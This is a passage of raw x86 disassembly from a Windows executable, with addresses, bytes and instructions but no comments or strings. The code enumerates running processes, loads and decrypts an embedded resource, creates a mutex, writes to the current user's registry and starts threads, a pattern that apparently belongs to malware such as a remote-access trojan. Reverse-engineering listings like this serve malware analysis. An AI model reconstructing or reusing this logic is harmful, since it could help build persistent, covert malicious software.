  407a6d:	b9 20 57 41 00       	mov    $0x415720,%ecx
  407a72:	ff 15 58 02 41 00    	call   *0x410258
  407a78:	50                   	push   %eax
  407a79:	ff 15 84 01 41 00    	call   *0x410184
  407a7f:	6a 11                	push   $0x11
  407a81:	8b cb                	mov    %ebx,%ecx
  407a83:	e8 01 98 ff ff       	call   0x401289
  407a88:	50                   	push   %eax
  407a89:	68 cc 08 41 00       	push   $0x4108cc
  407a8e:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  407a91:	68 20 57 41 00       	push   $0x415720
  407a96:	50                   	push   %eax
  407a97:	e8 84 81 00 00       	call   0x40fc20
  407a9c:	83 c4 0c             	add    $0xc,%esp
  407a9f:	50                   	push   %eax
  407aa0:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  407aa3:	50                   	push   %eax
  407aa4:	e8 6b 81 00 00       	call   0x40fc14
  407aa9:	83 c4 0c             	add    $0xc,%esp
  407aac:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  407aaf:	50                   	push   %eax
  407ab0:	ff 15 64 02 41 00    	call   *0x410264
  407ab6:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  407ab9:	ff 15 54 02 41 00    	call   *0x410254
  407abf:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  407ac2:	ff 15 54 02 41 00    	call   *0x410254
  407ac8:	0f be 05 18 51 41 00 	movsbl 0x415118,%eax
  407acf:	83 e8 31             	sub    $0x31,%eax
  407ad2:	74 1e                	je     0x407af2
  407ad4:	48                   	dec    %eax
  407ad5:	75 34                	jne    0x407b0b
  407ad7:	83 ec 10             	sub    $0x10,%esp
  407ada:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407add:	8b cc                	mov    %esp,%ecx
  407adf:	50                   	push   %eax
  407ae0:	ff 15 60 02 41 00    	call   *0x410260
  407ae6:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  407aeb:	e8 e4 bc ff ff       	call   0x4037d4
  407af0:	eb 19                	jmp    0x407b0b
  407af2:	83 ec 10             	sub    $0x10,%esp
  407af5:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407af8:	8b cc                	mov    %esp,%ecx
  407afa:	50                   	push   %eax
  407afb:	ff 15 60 02 41 00    	call   *0x410260
  407b01:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  407b06:	e8 69 bc ff ff       	call   0x403774
  407b0b:	6a 14                	push   $0x14
  407b0d:	8b cb                	mov    %ebx,%ecx
  407b0f:	e8 75 97 ff ff       	call   0x401289
  407b14:	8b c8                	mov    %eax,%ecx
  407b16:	ff 15 34 02 41 00    	call   *0x410234
  407b1c:	80 38 01             	cmpb   $0x1,(%eax)
  407b1f:	75 0c                	jne    0x407b2d
  407b21:	56                   	push   %esi
  407b22:	56                   	push   %esi
  407b23:	56                   	push   %esi
  407b24:	68 57 e1 40 00       	push   $0x40e157
  407b29:	56                   	push   %esi
  407b2a:	56                   	push   %esi
  407b2b:	ff d7                	call   *%edi
  407b2d:	6a 16                	push   $0x16
  407b2f:	8b cb                	mov    %ebx,%ecx
  407b31:	e8 53 97 ff ff       	call   0x401289
  407b36:	8b c8                	mov    %eax,%ecx
  407b38:	ff 15 34 02 41 00    	call   *0x410234
  407b3e:	80 38 01             	cmpb   $0x1,(%eax)
  407b41:	75 0d                	jne    0x407b50
  407b43:	56                   	push   %esi
  407b44:	56                   	push   %esi
  407b45:	6a 01                	push   $0x1
  407b47:	68 57 e1 40 00       	push   $0x40e157
  407b4c:	56                   	push   %esi
  407b4d:	56                   	push   %esi
  407b4e:	ff d7                	call   *%edi
  407b50:	6a 23                	push   $0x23
  407b52:	8b cb                	mov    %ebx,%ecx
  407b54:	e8 30 97 ff ff       	call   0x401289
  407b59:	8b c8                	mov    %eax,%ecx
  407b5b:	ff 15 34 02 41 00    	call   *0x410234
  407b61:	80 38 01             	cmpb   $0x1,(%eax)
  407b64:	75 53                	jne    0x407bb9
  407b66:	6a 26                	push   $0x26
  407b68:	8b cb                	mov    %ebx,%ecx
  407b6a:	e8 1a 97 ff ff       	call   0x401289
  407b6f:	8b c8                	mov    %eax,%ecx
  407b71:	ff 15 58 02 41 00    	call   *0x410258
  407b77:	50                   	push   %eax
  407b78:	6a 25                	push   $0x25
  407b7a:	8b cb                	mov    %ebx,%ecx
  407b7c:	e8 08 97 ff ff       	call   0x401289
  407b81:	8b c8                	mov    %eax,%ecx
  407b83:	ff 15 34 02 41 00    	call   *0x410234
  407b89:	8a 00                	mov    (%eax),%al
  407b8b:	50                   	push   %eax
  407b8c:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  407b8f:	50                   	push   %eax
  407b90:	e8 9a f5 ff ff       	call   0x40712f
  407b95:	83 c4 0c             	add    $0xc,%esp
  407b98:	b9 a8 51 41 00       	mov    $0x4151a8,%ecx
  407b9d:	50                   	push   %eax
  407b9e:	ff 15 64 02 41 00    	call   *0x410264
  407ba4:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  407ba7:	ff 15 54 02 41 00    	call   *0x410254
  407bad:	56                   	push   %esi
  407bae:	56                   	push   %esi
  407baf:	56                   	push   %esi
  407bb0:	68 83 18 40 00       	push   $0x401883
  407bb5:	56                   	push   %esi
  407bb6:	56                   	push   %esi
  407bb7:	ff d7                	call   *%edi
  407bb9:	6a 2b                	push   $0x2b
  407bbb:	8b cb                	mov    %ebx,%ecx
  407bbd:	e8 c7 96 ff ff       	call   0x401289
  407bc2:	8b c8                	mov    %eax,%ecx
  407bc4:	ff 15 34 02 41 00    	call   *0x410234
  407bca:	80 38 01             	cmpb   $0x1,(%eax)
  407bcd:	75 39                	jne    0x407c08
  407bcf:	6a 2d                	push   $0x2d
  407bd1:	8b cb                	mov    %ebx,%ecx
  407bd3:	e8 b1 96 ff ff       	call   0x401289
  407bd8:	8b c8                	mov    %eax,%ecx
  407bda:	ff 15 58 02 41 00    	call   *0x410258
  407be0:	50                   	push   %eax
  407be1:	ff 15 9c 03 41 00    	call   *0x41039c
  407be7:	59                   	pop    %ecx
  407be8:	50                   	push   %eax
  407be9:	6a 2c                	push   $0x2c
  407beb:	8b cb                	mov    %ebx,%ecx
  407bed:	e8 97 96 ff ff       	call   0x401289
  407bf2:	8b c8                	mov    %eax,%ecx
  407bf4:	ff 15 34 02 41 00    	call   *0x410234
  407bfa:	80 38 00             	cmpb   $0x0,(%eax)
  407bfd:	0f 95 c0             	setne  %al
  407c00:	50                   	push   %eax
  407c01:	e8 66 e3 ff ff       	call   0x405f6c
  407c06:	59                   	pop    %ecx
  407c07:	59                   	pop    %ecx
  407c08:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  407c0b:	50                   	push   %eax
  407c0c:	e8 38 69 00 00       	call   0x40e549
  407c11:	59                   	pop    %ecx
  407c12:	50                   	push   %eax
  407c13:	b9 88 59 41 00       	mov    $0x415988,%ecx
  407c18:	ff 15 b8 01 41 00    	call   *0x4101b8
  407c1e:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  407c21:	ff 15 c0 02 41 00    	call   *0x4102c0
  407c27:	a1 60 59 41 00       	mov    0x415960,%eax
  407c2c:	3b c6                	cmp    %esi,%eax
  407c2e:	74 03                	je     0x407c33
  407c30:	56                   	push   %esi
  407c31:	ff d0                	call   *%eax
  407c33:	e8 3b 22 00 00       	call   0x409e73
  407c38:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  407c3b:	ff 15 54 02 41 00    	call   *0x410254
  407c41:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407c44:	ff 15 54 02 41 00    	call   *0x410254
  407c4a:	8b c6                	mov    %esi,%eax
  407c4c:	5f                   	pop    %edi
  407c4d:	5e                   	pop    %esi
  407c4e:	5b                   	pop    %ebx
  407c4f:	c9                   	leave
  407c50:	c2 10 00             	ret    $0x10
  407c53:	55                   	push   %ebp
  407c54:	8b ec                	mov    %esp,%ebp
  407c56:	81 ec 40 04 00 00    	sub    $0x440,%esp
  407c5c:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  407c60:	53                   	push   %ebx
  407c61:	56                   	push   %esi
  407c62:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407c65:	57                   	push   %edi
  407c66:	50                   	push   %eax
  407c67:	e8 e4 04 00 00       	call   0x408150
  407c6c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407c6f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407c72:	0f b6 18             	movzbl (%eax),%ebx
  407c75:	53                   	push   %ebx
  407c76:	ff 15 7c 03 41 00    	call   *0x41037c
  407c7c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407c7f:	59                   	pop    %ecx
  407c80:	59                   	pop    %ecx
  407c81:	8b f8                	mov    %eax,%edi
  407c83:	8b cb                	mov    %ebx,%ecx
  407c85:	8d 72 01             	lea    0x1(%edx),%esi
  407c88:	8b d1                	mov    %ecx,%edx
  407c8a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  407c8d:	c1 e9 02             	shr    $0x2,%ecx
  407c90:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407c92:	8b ca                	mov    %edx,%ecx
  407c94:	83 e1 03             	and    $0x3,%ecx
  407c97:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  407c99:	8d 4d f7             	lea    -0x9(%ebp),%ecx
  407c9c:	51                   	push   %ecx
  407c9d:	53                   	push   %ebx
  407c9e:	50                   	push   %eax
  407c9f:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  407ca2:	ff 15 70 02 41 00    	call   *0x410270
  407ca8:	50                   	push   %eax
  407ca9:	b9 50 59 41 00       	mov    $0x415950,%ecx
  407cae:	ff 15 64 02 41 00    	call   *0x410264
  407cb4:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  407cb7:	ff 15 54 02 41 00    	call   *0x410254
  407cbd:	83 c8 ff             	or     $0xffffffff,%eax
  407cc0:	2b c3                	sub    %ebx,%eax
  407cc2:	01 45 fc             	add    %eax,-0x4(%ebp)
  407cc5:	ff 75 fc             	push   -0x4(%ebp)
  407cc8:	ff 15 7c 03 41 00    	call   *0x41037c
  407cce:	8b f8                	mov    %eax,%edi
  407cd0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407cd3:	59                   	pop    %ecx
  407cd4:	89 7d f0             	mov    %edi,-0x10(%ebp)
  407cd7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407cda:	8d 74 03 01          	lea    0x1(%ebx,%eax,1),%esi
  407cde:	8b c1                	mov    %ecx,%eax
  407ce0:	53                   	push   %ebx
  407ce1:	c1 e9 02             	shr    $0x2,%ecx
  407ce4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407ce6:	ff 75 ec             	push   -0x14(%ebp)
  407ce9:	8b c8                	mov    %eax,%ecx
  407ceb:	83 e1 03             	and    $0x3,%ecx
  407cee:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  407cf0:	8d 8d c0 fb ff ff    	lea    -0x440(%ebp),%ecx
  407cf6:	e8 f0 ab ff ff       	call   0x4028eb
  407cfb:	ff 75 fc             	push   -0x4(%ebp)
  407cfe:	8d 45 dc             	lea    -0x24(%ebp),%eax
  407d01:	8d 8d c0 fb ff ff    	lea    -0x440(%ebp),%ecx
  407d07:	ff 75 f0             	push   -0x10(%ebp)
  407d0a:	50                   	push   %eax
  407d0b:	e8 1a ad ff ff       	call   0x402a2a
  407d10:	ff 75 f0             	push   -0x10(%ebp)
  407d13:	ff 15 80 03 41 00    	call   *0x410380
  407d19:	59                   	pop    %ecx
  407d1a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  407d1d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407d20:	50                   	push   %eax
  407d21:	ff 15 60 02 41 00    	call   *0x410260
  407d27:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407d2a:	ff 15 54 02 41 00    	call   *0x410254
  407d30:	8b 45 08             	mov    0x8(%ebp),%eax
  407d33:	5f                   	pop    %edi
  407d34:	5e                   	pop    %esi
  407d35:	5b                   	pop    %ebx
  407d36:	c9                   	leave
  407d37:	c3                   	ret
  407d38:	53                   	push   %ebx
  407d39:	8b 1d 40 01 41 00    	mov    0x410140,%ebx
  407d3f:	56                   	push   %esi
  407d40:	57                   	push   %edi
  407d41:	68 0c 11 41 00       	push   $0x41110c
  407d46:	68 00 11 41 00       	push   $0x411100
  407d4b:	ff d3                	call   *%ebx
  407d4d:	8b 35 44 01 41 00    	mov    0x410144,%esi
  407d53:	50                   	push   %eax
  407d54:	ff d6                	call   *%esi
  407d56:	8b 3d 90 01 41 00    	mov    0x410190,%edi
  407d5c:	a3 2c 59 41 00       	mov    %eax,0x41592c
  407d61:	85 c0                	test   %eax,%eax
  407d63:	75 14                	jne    0x407d79
  407d65:	68 0c 11 41 00       	push   $0x41110c
  407d6a:	68 f0 10 41 00       	push   $0x4110f0
  407d6f:	ff d7                	call   *%edi
  407d71:	50                   	push   %eax
  407d72:	ff d6                	call   *%esi
  407d74:	a3 2c 59 41 00       	mov    %eax,0x41592c
  407d79:	68 d8 10 41 00       	push   $0x4110d8
  407d7e:	68 00 11 41 00       	push   $0x411100
  407d83:	ff d3                	call   *%ebx
  407d85:	50                   	push   %eax
  407d86:	ff d6                	call   *%esi
  407d88:	83 3d 2c 59 41 00 00 	cmpl   $0x0,0x41592c
  407d8f:	a3 28 59 41 00       	mov    %eax,0x415928
  407d94:	75 14                	jne    0x407daa
  407d96:	68 d8 10 41 00       	push   $0x4110d8
  407d9b:	68 f0 10 41 00       	push   $0x4110f0
  407da0:	ff d7                	call   *%edi
  407da2:	50                   	push   %eax
  407da3:	ff d6                	call   *%esi
  407da5:	a3 28 59 41 00       	mov    %eax,0x415928
  407daa:	68 c0 10 41 00       	push   $0x4110c0
  407daf:	68 b0 10 41 00       	push   $0x4110b0
  407db4:	ff d3                	call   *%ebx
  407db6:	50                   	push   %eax
  407db7:	ff d6                	call   *%esi
  407db9:	bb a4 10 41 00       	mov    $0x4110a4,%ebx
  407dbe:	68 94 10 41 00       	push   $0x411094
  407dc3:	53                   	push   %ebx
  407dc4:	a3 34 59 41 00       	mov    %eax,0x415934
  407dc9:	ff d7                	call   *%edi
  407dcb:	50                   	push   %eax
  407dcc:	ff d6                	call   *%esi
  407dce:	68 80 10 41 00       	push   $0x411080
  407dd3:	53                   	push   %ebx
  407dd4:	a3 94 5b 41 00       	mov    %eax,0x415b94
  407dd9:	ff d7                	call   *%edi
  407ddb:	50                   	push   %eax
  407ddc:	ff d6                	call   *%esi
  407dde:	68 70 10 41 00       	push   $0x411070
  407de3:	68 68 10 41 00       	push   $0x411068
  407de8:	a3 98 5b 41 00       	mov    %eax,0x415b98
  407ded:	ff d7                	call   *%edi
  407def:	50                   	push   %eax
  407df0:	ff d6                	call   *%esi
  407df2:	68 54 10 41 00       	push   $0x411054
  407df7:	53                   	push   %ebx
  407df8:	a3 30 59 41 00       	mov    %eax,0x415930
  407dfd:	ff d7                	call   *%edi
  407dff:	50                   	push   %eax
  407e00:	ff d6                	call   *%esi
  407e02:	5f                   	pop    %edi
  407e03:	5e                   	pop    %esi
  407e04:	a3 60 59 41 00       	mov    %eax,0x415960
  407e09:	5b                   	pop    %ebx
  407e0a:	c3                   	ret
  407e0b:	55                   	push   %ebp
  407e0c:	8b ec                	mov    %esp,%ebp
  407e0e:	81 ec 04 03 00 00    	sub    $0x304,%esp
  407e14:	53                   	push   %ebx
  407e15:	56                   	push   %esi
  407e16:	57                   	push   %edi
  407e17:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  407e1d:	68 04 01 00 00       	push   $0x104
  407e22:	50                   	push   %eax
  407e23:	6a 00                	push   $0x0
  407e25:	ff 15 6c 00 41 00    	call   *0x41006c
  407e2b:	8b 35 38 02 41 00    	mov    0x410238,%esi
  407e31:	8d 45 08             	lea    0x8(%ebp),%eax
  407e34:	68 60 05 41 00       	push   $0x410560
  407e39:	50                   	push   %eax
  407e3a:	ff d6                	call   *%esi
  407e3c:	8b 1d 58 01 41 00    	mov    0x410158,%ebx
  407e42:	59                   	pop    %ecx
  407e43:	84 c0                	test   %al,%al
  407e45:	59                   	pop    %ecx
  407e46:	0f 85 62 01 00 00    	jne    0x407fae
  407e4c:	8d 45 ff             	lea    -0x1(%ebp),%eax
  407e4f:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407e52:	50                   	push   %eax
  407e53:	ff 15 50 02 41 00    	call   *0x410250
  407e59:	6a 00                	push   $0x0
  407e5b:	6a 02                	push   $0x2
  407e5d:	e8 8e 7d 00 00       	call   0x40fbf0
  407e62:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407e65:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
  407e6b:	50                   	push   %eax
  407e6c:	c7 85 00 fe ff ff 28 	movl   $0x128,-0x200(%ebp)
  407e73:	01 00 00 
  407e76:	ff 75 f8             	push   -0x8(%ebp)
  407e79:	e8 6c 7d 00 00       	call   0x40fbea
  407e7e:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
  407e84:	50                   	push   %eax
  407e85:	ff 75 f8             	push   -0x8(%ebp)
  407e88:	e8 57 7d 00 00       	call   0x40fbe4
  407e8d:	bf 68 06 41 00       	mov    $0x410668,%edi
  407e92:	85 c0                	test   %eax,%eax
  407e94:	0f 84 f5 00 00 00    	je     0x407f8f
  407e9a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  407e9d:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407ea0:	50                   	push   %eax
  407ea1:	8d 85 24 fe ff ff    	lea    -0x1dc(%ebp),%eax
  407ea7:	50                   	push   %eax
  407ea8:	ff 15 4c 02 41 00    	call   *0x41024c
  407eae:	ff 35 6c 03 41 00    	push   0x41036c
  407eb4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407eb7:	ff 15 a0 01 41 00    	call   *0x4101a0
  407ebd:	50                   	push   %eax
  407ebe:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407ec1:	ff 15 a4 01 41 00    	call   *0x4101a4
  407ec7:	50                   	push   %eax
  407ec8:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407ecb:	ff 15 a0 01 41 00    	call   *0x4101a0
  407ed1:	50                   	push   %eax
  407ed2:	e8 90 07 00 00       	call   0x408667
  407ed7:	8d 45 08             	lea    0x8(%ebp),%eax
  407eda:	50                   	push   %eax
  407edb:	8d 45 d8             	lea    -0x28(%ebp),%eax
  407ede:	50                   	push   %eax
  407edf:	ff 15 28 02 41 00    	call   *0x410228
  407ee5:	83 c4 18             	add    $0x18,%esp
  407ee8:	84 c0                	test   %al,%al
  407eea:	75 1a                	jne    0x407f06
  407eec:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407eef:	ff 15 54 02 41 00    	call   *0x410254
  407ef5:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
  407efb:	50                   	push   %eax
  407efc:	ff 75 f8             	push   -0x8(%ebp)
  407eff:	e8 e0 7c 00 00       	call   0x40fbe4
  407f04:	eb 8c                	jmp    0x407e92
  407f06:	ff b5 08 fe ff ff    	push   -0x1f8(%ebp)
  407f0c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  407f0f:	50                   	push   %eax
  407f10:	e8 ff 71 00 00       	call   0x40f114
  407f15:	59                   	pop    %ecx
  407f16:	59                   	pop    %ecx
  407f17:	50                   	push   %eax
  407f18:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407f1b:	ff 15 64 02 41 00    	call   *0x410264
  407f21:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407f24:	ff 15 54 02 41 00    	call   *0x410254
  407f2a:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  407f30:	50                   	push   %eax
  407f31:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407f34:	50                   	push   %eax
  407f35:	ff d6                	call   *%esi
  407f37:	59                   	pop    %ecx
  407f38:	84 c0                	test   %al,%al
  407f3a:	59                   	pop    %ecx
  407f3b:	74 17                	je     0x407f54
  407f3d:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407f40:	ff 15 54 02 41 00    	call   *0x410254
  407f46:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407f49:	ff 15 54 02 41 00    	call   *0x410254
  407f4f:	e9 ec 01 00 00       	jmp    0x408140
  407f54:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407f57:	57                   	push   %edi
  407f58:	50                   	push   %eax
  407f59:	ff d6                	call   *%esi
  407f5b:	59                   	pop    %ecx
  407f5c:	84 c0                	test   %al,%al
  407f5e:	59                   	pop    %ecx
  407f5f:	0f 85 c1 00 00 00    	jne    0x408026
  407f65:	ff b5 08 fe ff ff    	push   -0x1f8(%ebp)
  407f6b:	e8 6f 71 00 00       	call   0x40f0df
  407f70:	84 c0                	test   %al,%al
  407f72:	59                   	pop    %ecx
  407f73:	0f 85 ad 00 00 00    	jne    0x408026
  407f79:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407f7c:	8d 4d 08             	lea    0x8(%ebp),%ecx
  407f7f:	50                   	push   %eax
  407f80:	ff 15 a8 01 41 00    	call   *0x4101a8
  407f86:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407f89:	ff 15 54 02 41 00    	call   *0x410254
  407f8f:	ff 75 f8             	push   -0x8(%ebp)
  407f92:	ff d3                	call   *%ebx
  407f94:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407f97:	57                   	push   %edi
  407f98:	50                   	push   %eax
  407f99:	ff d6                	call   *%esi
  407f9b:	59                   	pop    %ecx
  407f9c:	84 c0                	test   %al,%al
  407f9e:	59                   	pop    %ecx
  407f9f:	0f 84 8f 00 00 00    	je     0x408034
  407fa5:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407fa8:	ff 15 54 02 41 00    	call   *0x410254
  407fae:	8d 45 c0             	lea    -0x40(%ebp),%eax
  407fb1:	50                   	push   %eax
  407fb2:	e8 17 66 00 00       	call   0x40e5ce
  407fb7:	59                   	pop    %ecx
  407fb8:	50                   	push   %eax
  407fb9:	8d 4d 08             	lea    0x8(%ebp),%ecx
  407fbc:	ff 15 64 02 41 00    	call   *0x410264
  407fc2:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407fc5:	ff 15 54 02 41 00    	call   *0x410254
  407fcb:	e8 e5 70 00 00       	call   0x40f0b5
  407fd0:	84 c0                	test   %al,%al
  407fd2:	74 36                	je     0x40800a
  407fd4:	bf 3c 11 41 00       	mov    $0x41113c,%edi
  407fd9:	6a 00                	push   $0x0
  407fdb:	57                   	push   %edi
  407fdc:	8d 4d 08             	lea    0x8(%ebp),%ecx
  407fdf:	ff 15 20 02 41 00    	call   *0x410220
  407fe5:	8b d0                	mov    %eax,%edx
  407fe7:	a1 9c 02 41 00       	mov    0x41029c,%eax
  407fec:	3b 10                	cmp    (%eax),%edx
  407fee:	74 1a                	je     0x40800a
  407ff0:	83 c9 ff             	or     $0xffffffff,%ecx
  407ff3:	33 c0                	xor    %eax,%eax
  407ff5:	f2 ae                	repnz scas %es:(%edi),%al
  407ff7:	f7 d1                	not    %ecx
  407ff9:	49                   	dec    %ecx
  407ffa:	68 24 11 41 00       	push   $0x411124
  407fff:	51                   	push   %ecx
  408000:	52                   	push   %edx
  408001:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408004:	ff 15 ac 01 41 00    	call   *0x4101ac
  40800a:	8d 45 08             	lea    0x8(%ebp),%eax
  40800d:	50                   	push   %eax
  40800e:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  408014:	50                   	push   %eax
  408015:	ff 15 b0 01 41 00    	call   *0x4101b0
  40801b:	59                   	pop    %ecx
  40801c:	84 c0                	test   %al,%al
  40801e:	59                   	pop    %ecx
  40801f:	74 1c                	je     0x40803d
  408021:	e9 1a 01 00 00       	jmp    0x408140
  408026:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408029:	ff 15 54 02 41 00    	call   *0x410254
  40802f:	e9 71 ff ff ff       	jmp    0x407fa5
  408034:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  408037:	ff 15 54 02 41 00    	call   *0x410254
  40803d:	6a 01                	push   $0x1
  40803f:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  408045:	6a 25                	push   $0x25
  408047:	50                   	push   %eax
  408048:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  40804e:	ff 15 f4 02 41 00    	call   *0x4102f4
  408054:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  40805a:	ff 15 f0 02 41 00    	call   *0x4102f0
  408060:	84 c0                	test   %al,%al
  408062:	0f 84 cc 00 00 00    	je     0x408134
  408068:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40806b:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  408071:	50                   	push   %eax
  408072:	ff 15 ec 02 41 00    	call   *0x4102ec
  408078:	6a 06                	push   $0x6
  40807a:	8b f0                	mov    %eax,%esi
  40807c:	59                   	pop    %ecx
  40807d:	8d 7d b8             	lea    -0x48(%ebp),%edi
  408080:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408082:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  408085:	e8 fe d1 ff ff       	call   0x405288
  40808a:	50                   	push   %eax
  40808b:	e8 3c 7c 00 00       	call   0x40fccc
  408090:	59                   	pop    %ecx
  408091:	33 f6                	xor    %esi,%esi
  408093:	56                   	push   %esi
  408094:	56                   	push   %esi
  408095:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  40809b:	8b f8                	mov    %eax,%edi
  40809d:	ff 15 e8 02 41 00    	call   *0x4102e8
  4080a3:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4080a6:	e8 dd d1 ff ff       	call   0x405288
  4080ab:	50                   	push   %eax
  4080ac:	57                   	push   %edi
  4080ad:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  4080b3:	ff 15 e4 02 41 00    	call   *0x4102e4
  4080b9:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  4080bf:	ff 15 e0 02 41 00    	call   *0x4102e0
  4080c5:	68 34 10 41 00       	push   $0x411034
  4080ca:	6a 01                	push   $0x1
  4080cc:	56                   	push   %esi
  4080cd:	ff 15 74 00 41 00    	call   *0x410074
  4080d3:	57                   	push   %edi
  4080d4:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4080d7:	8b f0                	mov    %eax,%esi
  4080d9:	ff 15 58 02 41 00    	call   *0x410258
  4080df:	50                   	push   %eax
  4080e0:	e8 92 53 00 00       	call   0x40d477
  4080e5:	59                   	pop    %ecx
  4080e6:	84 c0                	test   %al,%al
  4080e8:	59                   	pop    %ecx
  4080e9:	74 24                	je     0x40810f
  4080eb:	6a 01                	push   $0x1
  4080ed:	68 30 10 41 00       	push   $0x411030
  4080f2:	b9 e8 57 41 00       	mov    $0x4157e8,%ecx
  4080f7:	ff 15 58 02 41 00    	call   *0x410258
  4080fd:	50                   	push   %eax
  4080fe:	68 01 00 00 80       	push   $0x80000001
  408103:	e8 3e 0f 00 00       	call   0x409046
  408108:	83 c4 10             	add    $0x10,%esp
  40810b:	b3 01                	mov    $0x1,%bl
  40810d:	eb 05                	jmp    0x408114
  40810f:	56                   	push   %esi
  408110:	ff d3                	call   *%ebx
  408112:	32 db                	xor    %bl,%bl
  408114:	57                   	push   %edi
  408115:	e8 12 7b 00 00       	call   0x40fc2c
  40811a:	59                   	pop    %ecx
  40811b:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  408121:	ff 15 dc 02 41 00    	call   *0x4102dc
  408127:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40812a:	ff 15 54 02 41 00    	call   *0x410254
  408130:	8a c3                	mov    %bl,%al
  408132:	eb 17                	jmp    0x40814b
  408134:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  40813a:	ff 15 dc 02 41 00    	call   *0x4102dc
  408140:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408143:	ff 15 54 02 41 00    	call   *0x410254
  408149:	32 c0                	xor    %al,%al
  40814b:	5f                   	pop    %edi
  40814c:	5e                   	pop    %esi
  40814d:	5b                   	pop    %ebx
  40814e:	c9                   	leave
  40814f:	c3                   	ret
  408150:	55                   	push   %ebp
  408151:	8b ec                	mov    %esp,%ebp
  408153:	56                   	push   %esi
  408154:	57                   	push   %edi
  408155:	6a 0a                	push   $0xa
  408157:	68 4c 11 41 00       	push   $0x41114c
  40815c:	6a 00                	push   $0x0
  40815e:	ff 15 94 00 41 00    	call   *0x410094
  408164:	8b f8                	mov    %eax,%edi
  408166:	57                   	push   %edi
  408167:	6a 00                	push   $0x0
  408169:	ff 15 90 00 41 00    	call   *0x410090
  40816f:	50                   	push   %eax
  408170:	ff 15 8c 00 41 00    	call   *0x41008c
  408176:	57                   	push   %edi
  408177:	6a 00                	push   $0x0
  408179:	8b f0                	mov    %eax,%esi
  40817b:	ff 15 88 00 41 00    	call   *0x410088
  408181:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408184:	5f                   	pop    %edi
  408185:	89 31                	mov    %esi,(%ecx)
  408187:	5e                   	pop    %esi
  408188:	5d                   	pop    %ebp
  408189:	c3                   	ret
  40818a:	55                   	push   %ebp
  40818b:	8b ec                	mov    %esp,%ebp
  40818d:	51                   	push   %ecx
  40818e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408191:	6a 03                	push   $0x3
  408193:	50                   	push   %eax
  408194:	6a 5a                	push   $0x5a
  408196:	68 00 08 00 00       	push   $0x800
